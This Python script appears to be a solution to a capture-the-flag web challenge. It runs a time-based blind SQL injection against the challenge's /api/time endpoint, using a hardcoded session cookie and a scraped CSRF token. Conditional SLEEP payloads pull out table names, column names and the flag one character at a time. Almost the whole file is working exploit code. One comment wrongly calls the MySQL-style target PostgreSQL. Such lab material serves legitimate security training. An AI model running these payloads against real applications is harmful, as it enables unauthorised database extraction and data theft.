import requests
import re
import time

URL_BASE = "http://web-17.challs.olicyber.it/"

session_cookie = "eyJjc3JmX3Rva2VuIjoiODI1YzY1ZjE5YmI4OTIyYjZkOTRjMTUwN2MzZjg4MzE1MzFkMjc1MSJ9.ai0bTA.HbOPdh8UolnQBJlVFnaDIitc7ZY"

session = requests.session()

session.cookies.update({
    "session": session_cookie
})

page = session.get(f"{URL_BASE}/time")
csrf_token = re.search(r"csrf_token = '(.+?)'", page.text).group(1)
print(f"CSRF token: {csrf_token}")

sleep = "(SELECT SLEEP(2) FROM information_schema.tables)"

#query = f"1' AND IF (version() IS NOT NULL, {sleep}, 0)-- -" #-> it's PostgreSQL
#query = f"1' AND IF( (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 2, {sleep}, 0)-- -" #get number of tables
query = f"1' AND IF( LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) ) = 11, {sleep}, 0)-- -" #get total length

r = session.post(
    f"{URL_BASE}/api/time",
    json={"query": query},
    headers={"X-CSRFToken": csrf_token}
)

print(r.status_code) 
#print(r.json()) 


found = ""
for i in range (1, 12):
    for c in ",_}{abcdefghijklmnopqrstuvwxyz012345":
        #get table names
        #query = f"1' AND IF( SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1) = '{c}', {sleep}, 0 )-- -"

        #get column names
        #query = f"1' AND IF( SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='flags'),{i},1) = '{c}', {sleep}, 0 )-- -"

        #get flag from table flags
        query = f"1' AND IF( SUBSTRING((SELECT flag FROM flags), {i}, 1) = '{c}', {sleep}, 0 )-- -"
        t0 = time.time()

        r = session.post(
            f"{URL_BASE}/api/time",
            json={"query": query},
            headers={"X-CSRFToken": csrf_token}
        )

        res_time = time.time() - t0

        if(r.status_code == 200 and res_time > 1.5):
            found += c
            print(f"Found: {found}")
            break
print(found)

